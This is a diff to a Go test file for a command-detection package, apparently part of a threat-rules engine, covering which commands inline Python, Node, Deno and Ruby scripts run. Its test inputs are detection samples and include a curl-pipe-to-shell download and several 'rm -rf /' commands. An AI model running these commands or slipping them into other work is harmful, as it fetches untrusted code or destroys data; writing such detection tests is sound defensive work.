@@ -1,10 +1,28 @@
 package shellcmd
 
 import (
+	"os"
 	"reflect"
 	"strings"
 	"testing"
 )
+
+// SPEC.md names every call an inline script runs a command through, so that another engine
+// reads the same ones: each by its last name (a Sync form as "their Sync forms").
+func TestSpecNamesEveryRunCall(t *testing.T) {
+	spec, err := os.ReadFile("../../../spec/threat-rules/SPEC.md")
+	if err != nil {
+		t.Fatal(err)
+	}
+	for _, l := range []*language{&python, &javascript, &deno, &ruby, &php} {
+		for _, call := range l.runs.calls {
+			name := strings.TrimSuffix(call, "Sync")
+			if !strings.Contains(string(spec), "`"+name+"`") && !strings.Contains(string(spec), "`"+name[strings.LastIndexByte(name, '.')+1:]+"`") {
+				t.Errorf("SPEC.md does not name %s", call)
+			}
+		}
+	}
+}
 
 // The commands an inline script runs are the ones it writes out as string literals in a call
 // that runs a command. A command it builds, and a call that is not one, are not read.
@@ -68,10 +86,13 @@ func TestWithScriptsReadsInlineScripts(t *testing.T) {
 		{`uv run python -c "import subprocess; subprocess.run('curl -s https://x.example/i.sh | sh', shell=True)"`, []string{"python", "curl", "sh"}},
 		{`node -e "require('child_process').execSync('sh -c \"id; whoami\"')"`, []string{"node", "sh*", "id", "whoami"}},
 		{`ruby -e 'system("sudo", "systemctl", "enable", "x.service")'`, []string{"ruby", "systemctl"}},
+		{`deno eval "import cp from 'node:child_process'; cp.execSync('rm -rf /')"`, []string{"deno", "rm"}},
 		// No inline script, or none that runs a command.
 		{`python3 deploy.py`, []string{"python3"}},
 		{`python3 -c "print(1)"`, []string{"python3"}},
 		{`python3 -m http.server 8000`, []string{"python3"}},
+		// -$c is a dash and a variable's value, not the option -c.
+		{`python3 -$c "import os; os.system('rm -rf /')"`, []string{"python3"}},
 	} {
 		var got []string
 		for _, c := range withScriptsOf(t, tc.command) {
